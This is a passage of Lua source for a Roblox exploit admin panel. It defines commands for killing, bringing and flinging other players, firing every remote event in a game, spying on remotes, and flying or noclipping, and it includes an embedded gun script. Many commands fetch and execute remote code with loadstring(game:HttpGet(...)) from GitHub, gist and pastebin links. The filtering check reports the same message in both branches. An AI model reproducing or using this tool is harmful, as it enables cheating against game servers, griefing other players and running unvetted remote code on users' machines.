			loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
		end)

		ADD_COMMAND('hidename','hidename (only works on billboard guis)',{},
		function()
			for _,item in pairs(workspace[game.Players.LocalPlayer.Name].Head:GetChildren()) do
				if item:IsA('BillboardGui') then
					item:Remove()
				end
			end
		end)

		ADD_COMMAND('homebrew','homebrew',{},
		function()
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
		end)

		ADD_COMMAND('krystaldance','krystaldance',{},
		function()
			loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/e51327540d1ba5ede244c459dbdb5a0e/raw/6320fe344ac51a311ef7c9f8d5c3924b1a7c3969/Krystal%2520Dance'))()
		end)

		ADD_COMMAND('chattrollgui','chattrollgui',{},
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/chatt", true))()
		end)

		ADD_COMMAND('fireremotes','fireremotes',{},
		function()
			NOTIFY('Fired all remotes!', 0, 255, 0)
			wait()
			for i,v in pairs(game:GetDescendants()) do
				if v:IsA("RemoteEvent") then
					v:FireServer()
					if v:IsA("BindableEvent") then
						v:Fire()
						if v:IsA("RemoteFunction") then
							v:InvokeServer()
						end
					end
				end
			end
		end)

		ADD_COMMAND('uafollow','uafollow / unanchoredfollow',{},
		function()
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local unanchoredparts = {}
			local movers = {}
			for index, part in pairs(workspace:GetDescendants()) do
				if part:IsA("Part") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false then
					table.insert(unanchoredparts, part)
					part.Massless = true
					part.CanCollide = false
					if part:FindFirstChildOfClass("BodyPosition") ~= nil then
						part:FindFirstChildOfClass("BodyPosition"):Destroy()
					end
				end
			end
			for index, part in pairs(unanchoredparts) do
				local mover = Instance.new("BodyPosition", part)
				table.insert(movers, mover)
				mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			end
			repeat
				for index, mover in pairs(movers) do
					mover.Position = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(0, 0, 5))
				end
				wait(0.5)
			until LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0
			for _, mover in pairs(movers) do
				mover:Destroy()
			end
		end)

		ADD_COMMAND('fov','fov',{},
		function(ARGS)
			game.Workspace.CurrentCamera.FieldOfView = tonumber(ARGS[1])
		end)

		ADD_COMMAND('uanograv','uanograv / unanchorednogravity',{},
		function()
			loadstring(game:HttpGet("https://pastebin.com/raw/MHdBcJQL", true))()
		end)

		ADD_COMMAND('bringua','bringua / bringunanchored',{},
		function()
			for _,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Anchored==false then
					v.CFrame=game:GetService("Players").LocalPlayer.Character.Head.CFrame
				end
			end
		end)

		ADD_COMMAND('remotespy','remotespy',{},
		function()
			loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
		end)

		ADD_COMMAND('blockhats','blockhats',{},
		function()
			for _, hat in pairs(character:GetChildren()) do
				if hat:IsA("Accoutrement") and hat:FindFirstChild("Handle") then
					local handle = hat.Handle
					if handle:FindFirstChildWhichIsA("SpecialMesh") then
						handle:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
					end
				end
			end
		end)

		ADD_COMMAND('blocktools','blocktools',{},
		function()
			for _, tool in pairs(character:GetChildren()) do
				if tool:IsA("Tool") then
					for _, mesh in pairs(tool:GetDescendants()) do
						if mesh:IsA("DataModelMesh") then
							mesh:Destroy()
						end
					end
				end
			end
		end)

		ADD_COMMAND('toolfling','toolfling',{},
		function()
			local char = player.Character
			local hrp = char:FindFirstChild("HumanoidRootPart")
			local hum = char:FindFirstChildWhichIsA("Humanoid")
			local tors = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
			if char then
				local c = lib.connect("pfling", RunService.Stepped:Connect(function()
					for i, v in pairs(char:GetDescendants()) do
						if v:IsA("BasePart") then
							v.CanCollide = false
						end
					end
				end))
				tors.Anchored = true
				local tool = Instance.new("Tool", localPlayer.Backpack)
				local hat = char:FindFirstChildOfClass("Accessory")
				local hathandle = hat.Handle

				hathandle.Parent = tool
				hathandle.Massless = true
				tool.GripPos = Vector3.new(0, 9e99, 0)
				tool.Parent = localPlayer.Character

				repeat wait() until char:FindFirstChildOfClass("Tool") ~= nil
				tool.Grip = CFrame.new(Vector3.new(0, 0, 0))
				tors.Anchored = false

				repeat
					hrp.CFrame = hrp.CFrame
					wait()
				until not c.Connected

				hum:UnequipTools()
				hathandle.Parent = hat
				hathandle.Massless = false
				tool:Destroy()
			end
		end)

		ADD_COMMAND('hydroxide','hydroxide',{},
		function()
			local owner = "Upbolt"
			local branch = "revision"

			local function webImport(file)
				return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
			end

			webImport("init")
			webImport("ui/main")
		end)

		ADD_COMMAND('equiptools','equiptools',{},
		function()
			for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool.Parent = game:GetService("Players").LocalPlayer.Character -- I didn't use Equip because the Equip function unequips any other tools in your character.
				end
			end
		end)


		ADD_COMMAND('oldroblox','oldroblox',{},
		function()
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					local dec = Instance.new("Texture", v)
					dec.Texture = "rbxassetid://48715260"
					dec.Face = "Top"
					dec.StudsPerTileU = "1"
					dec.StudsPerTileV = "1"
					dec.Transparency = v.Transparency
					v.Material = "Plastic"
					local dec2 = Instance.new("Texture", v)
					dec2.Texture = "rbxassetid://20299774"
					dec2.Face = "Bottom"
					dec2.StudsPerTileU = "1"
					dec2.StudsPerTileV = "1"
					dec2.Transparency = v.Transparency
					v.Material = "Plastic"
				end
			end
			game.Lighting.ClockTime = 12
			game.Lighting.GlobalShadows = false
			game.Lighting.Outlines = false
			for i,v in pairs(game.Lighting:GetDescendants()) do
				if v:IsA("Sky") then
					v:Destroy()
				end
			end
			local sky = Instance.new("Sky", game.Lighting)
			sky.SkyboxBk = "rbxassetid://161781263"
			sky.SkyboxDn = "rbxassetid://161781258"
			sky.SkyboxFt = "rbxassetid://161781261"
			sky.SkyboxLf = "rbxassetid://161781267"
			sky.SkyboxRt = "rbxassetid://161781268"
			sky.SkyboxUp = "rbxassetid://161781260"
		end)

		ADD_COMMAND('bringall','bringall (needs tools)',{},
		function()
			loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/blob/main/Bring%20All'))()
		end)

		ADD_COMMAND('killall','killall (needs tools)',{},
		function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Kill%20All'))()
		end)

		ADD_COMMAND('ws','ws [plr] [int]',{},
		function(ARGS, SPEAKER)
			local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
			for i,v in pairs(PLAYERS) do
				local PCHAR = gPlayers[v].Character
				if PCHAR:FindFirstChild('Humanoid') then
					PCHAR.Humanoid.WalkSpeed = tonumber(ARGS[2])
				end
			end
		end)

		ADD_COMMAND('goto','goto [plr]',{},
		function(ARGS, SPEAKER)
			local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
			for i,v in pairs(PLAYERS) do
				local PCHAR = gPlayers[v].Character
				if PCHAR then
					SPEAKER.Character.HumanoidRootPart.CFrame = PCHAR.HumanoidRootPart.CFrame
				end
			end
		end)

		ADD_COMMAND('enableinv','enableinv',{},
		function()
			game.StarterGui:SetCoreGuiEnabled(2, true)
		end)

		ADD_COMMAND('time','time [int]',{},
		function(ARGS, SPEAKER)
			gLighting:SetMinutesAfterMidnight(tonumber(ARGS[1]) * 60)
		end)

		ADD_COMMAND('view','view [plr]',{},
		function(ARGS, SPEAKER)
			local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
			for i,v in pairs(PLAYERS) do
				local PCHAR = gPlayers[v].Character
				gWorkspace.CurrentCamera.CameraSubject = PCHAR
			end
		end)

		ADD_COMMAND('unview','unview',{},
		function()
			gWorkspace.CurrentCamera.CameraSubject = gPlayers.LocalPlayer.Character
		end)

		local DISCO = false

		ADD_COMMAND('disco','disco',{},
		function(ARGS, SPEAKER)
			DISCO = true
			spawn(function()
				repeat wait(0.5) gLighting.Ambient = Color3.new(math.random(), math.random(), math.random()) until not DISCO
			end)
		end)

		ADD_COMMAND('undisco','undisco',{},
		function(ARGS, SPEAKER)
			DISCO = false
		end)

		ADD_COMMAND('age','age [plr]',{},
		function(ARGS, SPEAKER)
			local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
			for i,v in pairs(PLAYERS) do
				NOTIFY(gPlayers[v].Name .. ' | ' .. gPlayers[v].AccountAge, 255, 255, 255)
			end
		end)

		ADD_COMMAND('day','day',{},
		function(ARGS, SPEAKER)
			gLighting.TimeOfDay = 14
		end)

		ADD_COMMAND('night','night',{},
		function(ARGS, SPEAKER)
			gLighting.TimeOfDay = 24
		end)


		ADD_COMMAND('noclip','noclip',{},
		function()
			NOCLIP = true
			JESUSFLY = false
			SWIM = false
		end)

		ADD_COMMAND('f3xtroll','f3xtroll',{},
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/qipurblx/Scripts/main/f3xtrollhub", true))()
		end)

		ADD_COMMAND('f3x','f3x',{},
		function()
			loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
		end)

		ADD_COMMAND('clip','clip',{},
		function()
			NOCLIP = false
		end)

		ADD_COMMAND('fly','fly',{},
		function()
			NOTIFY('Toggle = E', 0, 255, 0)
			wait()
			repeat wait()
			until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("UpperTorso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
			local mouse = game.Players.LocalPlayer:GetMouse()
			repeat wait() until mouse
			local plr = game.Players.LocalPlayer
			local UpperTorso = plr.Character.UpperTorso
			local flying = true
			local deb = true
			local ctrl = {f = 0, b = 0, l = 0, r = 0}
			local lastctrl = {f = 0, b = 0, l = 0, r = 0}
			local maxspeed = 50
			local speed = 0

			function Fly()
				local bg = Instance.new("BodyGyro", UpperTorso)
				bg.P = 9e4
				bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				bg.cframe = UpperTorso.CFrame
				local bv = Instance.new("BodyVelocity", UpperTorso)
				bv.velocity = Vector3.new(0,0.1,0)
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
				repeat wait()
					plr.Character.Humanoid.PlatformStand = true
					if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
						speed = speed+.5+(speed/maxspeed)
						if speed > maxspeed then
							speed = maxspeed
						end
					elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
						speed = speed-1
						if speed < 0 then
							speed = 0
						end
					end
					if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
					elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					else
						bv.velocity = Vector3.new(0,0.1,0)
					end
					bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
				until not flying
				ctrl = {f = 0, b = 0, l = 0, r = 0}
				lastctrl = {f = 0, b = 0, l = 0, r = 0}
				speed = 0
				bg:Destroy()
				bv:Destroy()
				plr.Character.Humanoid.PlatformStand = false
			end
			mouse.KeyDown:connect(function(key)
				if key:lower() == "e" then
					if flying then flying = false
					else
						flying = true
						Fly()
					end
				elseif key:lower() == "w" then
					ctrl.f = 1
				elseif key:lower() == "s" then
					ctrl.b = -1
				elseif key:lower() == "a" then
					ctrl.l = -1
				elseif key:lower() == "d" then
					ctrl.r = 1
				end
			end)
			mouse.KeyUp:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 0
				elseif key:lower() == "s" then
					ctrl.b = 0
				elseif key:lower() == "a" then
					ctrl.l = 0
				elseif key:lower() == "d" then
					ctrl.r = 0
				end
			end)
			Fly()
		end)

		ADD_COMMAND('unfly','unfly',{},
		function(ARGS, SPEAKER)
			NOFLY()
		end)

		ADD_COMMAND('prefix','prefix [string]',{},
		function(ARGS, SPEAKER)
			if ARGS[1] then
				C_PREFIX = ARGS[1]
				NOTIFY('Changed prefix to \'' .. ARGS[1] .. '\'', 255, 255, 255)
			end
		end)

		ADD_COMMAND('version','version',{},
		function(ARGS, SPEAKER)
			NOTIFY('VERSION | ' .. VERSION, 255, 255, 255)
		end)

		ADD_COMMAND('fe','fe',{},
		function(ARGS, SPEAKER)
			spawn(function()
				CHECK_FE()
			end)
		end)

		ADD_COMMAND('changelog','changelog',{},
		function(ARGS, SPEAKER)
			CHECK_CHANGELOG()
		end)

		ADD_COMMAND('serverinfo','serverinfo',{'sinfo'},
		function(ARGS, SPEAKER)
			SERVER_INFO()
		end)

		ADD_COMMAND('cmds','cmds',{'commands'},
		function(ARGS, SPEAKER)
			LIST_COMMANDS()
		end)

--[[
for i,v in pairs(COMMANDS) do
   print (v.D)
end]]

		-- / noclip

		MOUSE.KeyDown:connect(function(key)
			if key:byte() == 29 then
				if not NOCLIP then
					ECOMMAND('noclip')
				elseif NOCLIP then
					ECOMMAND('clip')
				end
			elseif key:byte() == 30 then
				if not JESUSFLY then
					ECOMMAND('jesusfly')
				elseif JESUSFLY then
					ECOMMAND('nojfly')
				end
			end
		end)

		-- / after loaded

		function CHECK_FE()
			if not gWorkspace.FilteringEnabled then
				NOTIFY('Filtering is disabled', 0, 255, 0)
			elseif gWorkspace.FilteringEnabled then
				NOTIFY('Filtering is disabled', 255, 0, 0)
			end
		end

		function UPDATE_CMDS(SEARCH_CMD)
			local FOUND_CMDS = DATA.found_cmds
			if gCoreGui:FindFirstChild('cmds_seth') then
				local cmds_seth = gCoreGui.cmds_seth
				for i,v in pairs(cmds_seth.MAIN.CMDs:GetChildren()) do
					v:destroy()
				end
				for i,v in pairs(FOUND_CMDS:GetChildren()) do
					v:destroy()
				end
				wait()
				for i,v in pairs(COMMANDS) do
					if string.match(v.D, string.lower(SEARCH_CMD)) then
						local F = Instance.new('StringValue', FOUND_CMDS) F.Name = '' F.Value = v.D
					end
				end
				wait()
				local YSize = 25
				for i,v in pairs(FOUND_CMDS:GetChildren()) do
					local POS = ((i * YSize) - YSize)
					local cloneEX = cmds_seth.MAIN.Example:Clone()
					cloneEX.Parent = cmds_seth.MAIN.CMDs
					cloneEX.Visible = true
					cloneEX.Position = UDim2.new(0, 5, 0, POS + 5)
					cloneEX.Text = ' - ' .. v.Value
					cmds_seth.MAIN.CMDs.CanvasSize = UDim2.new(0, 0, 0, POS + 30)
				end
			end
		end

		function LIST_COMMANDS()
			if gCoreGui:FindFirstChild('cmds_seth') then gCoreGui.cmds_seth:destroy() end
			local cloneCMDs = DATA.guis.cmds_seth:Clone()
			local searchCMDs = cloneCMDs.MAIN.Search
			cloneCMDs.MAIN.Header.Text = ' ' .. #COMMANDS .. ' commands'
			cloneCMDs.Parent = gCoreGui
			cloneCMDs.MAIN.Exit.MouseButton1Down:connect(function()
				cloneCMDs:destroy()
			end)
			cloneCMDs.MAIN.MM.MouseButton1Down:connect(function()
				if cloneCMDs.MAIN.CMDs.Visible then
					cloneCMDs.MAIN.CMDs.Visible = false
				elseif not cloneCMDs.MAIN.CMDs.Visible then
					cloneCMDs.MAIN.CMDs.Visible = true
				end
			end)
			local function DISPLAY_CMDS()
				for i,v in pairs(COMMANDS) do
					local YSize = 25
					local POS = ((i * YSize) - YSize)
					local cloneEX = cloneCMDs.MAIN.Example:Clone()
					cloneEX.Parent = cloneCMDs.MAIN.CMDs
					cloneEX.Visible = true
					cloneEX.Position = UDim2.new(0, 5, 0, POS + 5)
					cloneEX.Text = ' - ' .. v.D
					cloneCMDs.MAIN.CMDs.CanvasSize = UDim2.new(0, 0, 0, POS + 30)
				end
			end
			DISPLAY_CMDS()
			searchCMDs.FocusLost:connect(function()
				if searchCMDs.Text then
					UPDATE_CMDS(searchCMDs.Text)
					searchCMDs.Text = ' search commands'
				end
			end)
		end

		local CAN_CHECK = true

		function CHECK_CHANGELOG()
			spawn(function()
				if CAN_CHECK then
					CAN_CHECK = false
					local changelogClone = DATA.guis.changelog_seth:Clone()
					changelogClone.MAIN.changelog.Text = CHANGELOG
					changelogClone.Parent = gCoreGui
					wait()
					changelogClone.MAIN:TweenPosition(UDim2.new(1, -410, 1, -210), 'InOut', 'Quad', 0.5, false)
					wait(10)
					changelogClone.MAIN:TweenPosition(UDim2.new(1, -410, 1, 0), 'InOut', 'Quad', 0.5, false)
					wait(1)
					changelogClone:destroy()
					CAN_CHECK = true
				end
			end)
		end

		CHECK_CHANGELOG()

		CMDbar:TweenPosition(UDim2.new(0, 0, 1, -50), 'InOut', 'Quad', 0.5, true)
		CMDbar.Parent['']:TweenPosition(UDim2.new(0, 0, 1, -30), 'InOut', 'Quad', 0.5, true)

		CMDbar.FocusLost:connect(function(enterpressed)
			if enterpressed and CMDbar.Text ~= '' then
				pcall(function()
					ECOMMAND(CMDbar.Text, LP)
				end)
			end
			CMDbar:TweenPosition(UDim2.new(0, -200, 1, -50), 'InOut', 'Quad', 0.5, true)
		end)

		MOUSE.KeyDown:connect(function(Key)
			if Key:byte() == 59 then
				CMDbar:TweenPosition(UDim2.new(0, 0, 1, -50), 'InOut', 'Quad', 0.5, true)
				CMDbar:CaptureFocus()
			end
		end)

		-- / loader

		wait()

		LOAD_SETH()
	end)
end
coroutine.wrap(FJHJF_fake_script)()
local function RTGO_fake_script() -- button_12.LocalScript 
	local script = Instance.new('LocalScript', button_12)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://gist.githubusercontent.com/jointeamck/7c4d164bd1a2726d5e352547c3f98052/raw/77332837d2d6669f50b191a5ecc90da7f6e6690e/Energize"))()
	end)
end
coroutine.wrap(RTGO_fake_script)()
local function WXHMD_fake_script() -- button_13.LocalScript 
	local script = Instance.new('LocalScript', button_13)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		wait(0.001); 

		--------------------------------------------------------------------------------------

		_clear=function()
			local c={char;bag;gui;};
			for i=1,#c do
				local c=c[i]:children();
				for i=1,#c do
					if(c[i].Name==name)then
						c[i].Parent=nil;
					end;
				end;
			end;
			local n=name..user.Name;
			local c=workspace:children();
			for i=1,#c do
				if(c[i].Name==n)then
					c[i].Parent=nil;
				end;
			end;
		end;

		_valid_key=function(object,key)
			return object[key],key;
		end;

		_new=function(class)
			return function(props)
				if(type(list_base_props)=='table')then
					for i,v in next,list_base_props do
						if(props[i]==nil)then
							props[i]=v;
						end;
					end;
				end;

				local object=class;

				if(type(class)=='string')then
					object=Instance.new(class:sub(1,1):upper()..class:sub(2));
				end;

				local parent=props[1];
				props[1]=nil;

				for i,v in next,props do
					local load,res,key=pcall(_valid_key,object,i:sub(1,1):upper()..i:sub(2));
					if(not load)then
						load,res,key=pcall(_valid_key,object,i);
					end;

					if(key)then
						t=type(res);
						s=tostring(res);
						if(t=='userdata'and s=='Signal '..key)then
							if(type(v)=='table')then
								for i=1,#v do
									res:connect(v[i]);
								end;
							else
								res:connect(v);
							end;
						else
							object[key]=v;
						end;
					end;
				end;

				if(parent)then
					object.Parent=parent;
				end;

				return object;
			end;
		end;

		_RGB=function(r,g,b)
			return Color3.new(r/255,g/255,b/255);
		end;

		_copy=function(o)
			local def=o.archivable;
			o.archivable=true;
			local c=o:clone();
			o.archivable=def;
			return c;
		end;

		_hum=function(char)
			local hum=char:findFirstChild'Humanoid';
			if(not hum or hum.className~='Humanoid')then
				local c=char:children();
				for i=1,#c do
					if(c[i].className=='Humanoid')then
						return c[i];
					end;
				end;
			else
				return hum;
			end;
		end;

		_hum_tag=function(hum)
			local c=hum:findFirstChild'creator'or Instance.new('ObjectValue',hum);
			c.Name='creator';
			c.Value=user;
			if(hum.Health==0 and not hum:findFirstChild'killed')then
				Instance.new('BoolValue',hum).Name='killed';
				bullets.clip=bullets.clip+10;
			end;
		end;

		_hum_dam=function(hum,dam,percent)
			hum.Health=hum.Health-(percent and hum.MaxHealth*(dam*0.01)or dam);
			if(hum.Health<=hum.MaxHealth*0.1)then
				_hum_tag(hum);
			end;
		end;

		_ray=function(v0,v1,i)
			local mag=(v0-v1).magnitude;
			local ray=Ray.new(v0,(v1-v0).unit*(mag>999 and 999 or mag));

			return(type(i)=='table'and workspace.FindPartOnRayWithIgnoreList or workspace.FindPartOnRay)(workspace,ray,i);
		end;

		_must=function(v0,v1,i)
			local hit,pos=_ray(v0,v1,i);
			return not hit and mouse.target or hit,pos;
		end;

		_cframe=function(x,y,z,r0,r1,r2)
			return CFrame.Angles(
				math.rad(r0 or 0),
				math.rad(r1 or 0),
				math.rad(r2 or 0)
			)*CFrame.new(x,y,z);
		end;

		_update=function()
			if(bool_active and not screen.Parent)then
				screen.Parent=gui;
			elseif(not bool_active and screen.Parent)then
				screen.Parent=nil;
			end;
		end;

		_light=function(v0,v1)
			local mag=(v0-v1).magnitude;
			local len=math.random(2,7);
			len=len>mag/2 and mag/2 or len;

			local light=_new'part'{
				cFrame=CFrame.new(v0,v1);
				size=Vector3.new(1,1,1);
				color=_RGB(255,255,0);
				anchored=true;
				inv;
			};
			_new'blockMesh'{
				scale=Vector3.new(0.2,0.2,len);
				offset=Vector3.new(0,0,-len/2);
				light;
			};

			local bb=_new'billboardGui'{
				size=UDim2.new(2,0,2,0);
				adornee=light;
				light;
			};
			_new'imageLabel'{
				image=url:format(109101526);
				backgroundTransparency=1;
				size=UDim2.new(1,0,1,0);
				bb;
			};

			_rem(light,0.15);
		end;

		_rem=function(object,del)
			if(del)then
				delay(del,function()
					if(object.Parent)then
						object.Parent=nil;
					end;
				end);
			else
				pcall(function()
					if(object.Parent)then
						object.Parent=nil;
					end;
				end);
			end;
		end;

		_blood=function(pos,count)
			for i=1,count do
				local p=_new'part'{
					rotVelocity=Vector3.new(math.random(),math.random(),math.random())*50;
					position=pos+Vector3.new(math.random(),math.random(),math.random());
					velocity=Vector3.new(math.random(),math.random(),math.random())*50;
					size=Vector3.new(math.random(),math.random(),math.random())/3;
					color=_RGB(255,0,0);
					transparency=0.5;
					canCollide=true;
					bottomSurface=0;
					topSurface=0;
					formFactor=3;
					locked=true;
					inv;
				};
				delay(5,function()
					p.Parent=nil;
				end);
			end;
		end;

		_make_hue=function()
			h_hue=_new'part'{
				size=Vector3.new(0.25,1.8,0.35);
				color=_RGB(100,100,100);
				formFactor=3;
				name='hue';
				handle;
			};
			hh_weld=_new'weld'{
				c1=_cframe(0,0.5,0);
				part0=handle;
				part1=h_hue;
				handle;
			};
		end;

		_shot=function(v0,v1)
			if(not time_left)then
				time_left=0;
			end;
			if(time_left>time())then
				return nil;
			else
				time_left=time()+math.random(1,10)/100;
			end;

			if(bullets.current<1)then
				local tick_sound=head:findFirstChild'tick_sound'or _new'sound'{
					soundId='rbxasset://sounds/SWITCH3.wav';
					name='tick_sound';
					volume=0.2;
					pitch=2;
					head;
				};
				tick_sound:play();
				if(bullets.clip>0)then
					time_left=time()+2;
					h_hue:breakJoints();
					h_hue.CanCollide=true;
					h_hue.Velocity=(h_hue.CFrame*CFrame.new(0,5,0)).lookVector*10;
					_rem(h_hue,10);
					delay(1.9,function()
						_make_hue();
						local got=(bullets.clip>bullets.maximum and 
							bullets.maximum or 
							bullets.clip)-bullets.current;

						bullets.clip=bullets.clip-got;
						bullets.current=bullets.current+got;
					end);
				end;
				return nil;
			else
				bullets.current=bullets.current-1;

				h_weld.C1=_cframe(0,0.75,0,
					-math.random(1000,1100)/10,180,0);
				d_weld.C1=_cframe(0,-0.25,0.3);

				lightstuff.Visible=true;
				delay(0.1,function()
					lightstuff.Visible=false;
				end);

				_rem(_new'part'{
					velocity=CFrame.new(drag.Position,(drag.CFrame*CFrame.new(-4,-5,0)).p).lookVector*10;
					cFrame=drag.CFrame*CFrame.new(-0.5,0,0);
					size=Vector3.new(0.1,0.1,0.4);
					color=_RGB(200,200,0);
					material='Slate';
					canCollide=true;
					formFactor=3;
					inv;
				},5);
				delay(0.1,function()
					d_weld.C1=_cframe(0,-0.25,0);
					if(bool_active)then
						h_weld.C1=h_weld_cf_active;
					end;
				end)
			end;

			local hit,pos=_must(v0,v1,char);

			shot_sound:play();

			_light(v0,v1);

			if(not hit)then return nil;end;

			if(hit.Parent.className=='Hat')then
				hit:breakJoints();
				hit.CanCollide=true;
				hit.Velocity=CFrame.new(v0,pos).lookVector*math.random(30,50);
				hit.RotVelocity=Vector3.new(math.random(1,90),math.random(1,90),math.random(1,90));
			else
				local hum=_hum(hit.Parent);
				if(not hum)then
					if(hit.Anchored==false and hit.Size.magnitude<4)then

					end;
				else

					_blood(pos,math.random(3,6));
					hit.RotVelocity=Vector3.new(math.random(1,90),math.random(1,90),math.random(1,90))/6;
					if(hit.Name=='Head')then

						_blood(pos,math.random(3,6));
						delay(0.001,function()
							_new(workspace:FindFirstChild'head_shot'or'sound'){
								pitch=math.random(70,100)*0.01;
								soundId=url:format(1876552);
								name='head_shot';
								workspace;
							}:play();
						end);
						_hum_tag(hum);
						_rem(_new'part'{
							cFrame=CFrame.new(v0,pos)*CFrame.new(0,0,-(v0-pos).magnitude*0.5);
							size=Vector3.new(0.1,0.1,(v0-pos).magnitude);
							color=torso.Color;
							transparency=0.5;
							canCollide=false;
							bottomSurface=0;
							anchored=true;
							formFactor=3;
							topSurface=0;
							inv;
						},30);
						hit.Parent=nil;
						for b=0,1 do
							for a=0,1 do
								for i=0,1 do
									_rem(_new'part'{
										velocity=CFrame.new(v0,pos).lookVector*20;
										cFrame=hit.CFrame*CFrame.new(i,-b,a);
										size=Vector3.new(0.5,0.5,0.5);
										color=_RGB(255,255,255);
										bottomSurface=0;
										canCollide=true;
										transparency=0;
										formFactor=3;
										topSurface=0;
										hum;
									},30);
								end;
							end;
						end;
					end;
				end;
			end;
		end;

		----------------------------------------------------------------------------------------

		_cf_select=function(mouse)
			mouse.Icon=url:format(109111387);--108999296
			bool_active=true;

			local arm=char:findFirstChild'Right Arm';
			local weld=torso:findFirstChild'Right Shoulder';
			if(arm and weld)then
				h_weld.Part0=arm;
				h_weld.C1=h_weld_cf_active;

				weld.Part1=nil;
				weld.Part0=nil;

				weld=_new(torso:findFirstChild'right_arml'or'weld'){
					name='right_arml';
					part0=torso;
					part1=arm;
					torso;
				};

				arml=(arml or 0)+1;
				local alv=arml;
				local gyro=torso:findFirstChild'p_gyro'or Instance.new('BodyGyro',torso);
				gyro.maxTorque=Vector3.new(5e5,5e5,5e5);
				gyro.P=30000;
				gyro.D=1000;
				gyro.Name='p_gyro';
				repeat
					local pos=mouse.hit.p;
					local val,valp,p0,p1,p2,hitpos,cj,c0,c1;

					val=-math.pi*0.5;
					valp=val*-1;
					p0=torso.CFrame;
					p0=p0+((p0*CFrame.Angles(valp,0,0)).lookVector*0.5)+(p0*CFrame.Angles(0,val,0)).lookVector;
					p1=p0+((p0.p-pos).unit*-2);
					p2=CFrame.new((p0.p+p1.p)/2,p0.p)*CFrame.Angles(val,val,0);
					hitpos=torso.Position;
					cj=CFrame.new(hitpos);
					c0=torso.CFrame:inverse()*cj;
					c1=p2:inverse()*cj;
					weld.C0=c0;
					weld.C1=c1;

					gyro.cframe=CFrame.new(torso.Position,Vector3.new(pos.X,torso.Position.Y,pos.Z));

					wait(0.001);
				until arml~=alv;
				gyro.Parent=nil;
			end;
		end;

		_cf_deselect=function()
			bool_active=false;
			arml=(arml or 0)+1;
			loop_shot=(loop_shot or 0)+1;

			h_weld.Part0=torso;
			h_weld.C1=h_weld_cf_inactive;

			local weld=torso:findFirstChild'right_arml';
			if(weld)then
				weld.Part1=nil;
				weld.Part0=nil;
			end;
			local arm=char:findFirstChild'Right Arm';
			local weld=torso:findFirstChild'Right Shoulder';
			if(arm and weld)then
				weld.Part0=torso;
				weld.Part1=arm;
			end;
		end;

		_cf_mouse=function(event,fun)
			mouse[event:sub(1,1):upper()..event:sub(2)]:connect(function(...)
				if(bool_active)then
					fun(...);
				end;
			end);
		end;

		----------------------------------------------------------------------------------------

		do
			local main=getfenv(0);
			local c=game:children();
			local check=function(v)
				if(v.className~=''and v.className~='Instance'and game:service(v.className))then
					main[v.className:sub(1,1):lower()..v.className:sub(2)]=v;
				end;
			end;
			for i=1,#c do
				pcall(check,c[i]);
			end;
		end;

		----------------------------------------------------------------------------------------

		bullets={
			maximum=51111111111111111111111111110;
			current=511111111111111111111111111111110;
			clip=501111111111111111111111111111111*4;
		};

		list_base_props={
			backgroundColor3=_RGB(0,0,0);
			textColor3=_RGB(200,200,200);
			borderSizePixel=0;
			color=_RGB(0,0,0);
			archivable=false;
			canCollide=false;
			bottomSurface=0;
			topSurface=0;
			formFactor=0;
